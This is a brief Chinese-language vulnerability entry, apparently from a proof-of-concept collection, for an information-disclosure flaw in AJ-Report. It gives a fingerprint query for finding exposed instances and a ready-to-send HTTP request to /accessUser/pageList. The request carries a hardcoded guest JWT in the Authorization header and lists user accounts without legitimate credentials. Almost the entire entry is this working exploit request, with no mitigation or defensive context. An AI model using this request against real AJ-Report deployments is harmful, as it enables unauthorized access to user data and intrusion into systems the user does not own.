# AJ-Report-showMoreSearch信息泄露漏洞

- **系统**：AJ-Report-showMoreSearch　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="AJ-Report"`
- **请求**：`GET /gaeaDict/all HTTP/1.1`
- **关键头**：`Cookie: sidebarStatus=0`　`Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjo…`

**请求体 / payload**
```
GET /accessUser/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
Host:
Cookie: sidebarStatus=0
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjowLCJ1dWlkIjoiMjY5NWU2M2M4ZTI5NGUwYWE5YmI0ZWFjMTlkNmYwZGQiLCJ0ZW5hbnQiOiJ0ZW5hbnRDb2RlIiwidXNlcm5hbWUiOiJndWVzdCJ9.5JSofjFh7AlhkQjsH7JM-Q02k2imQe52IS7q78ONpdM
```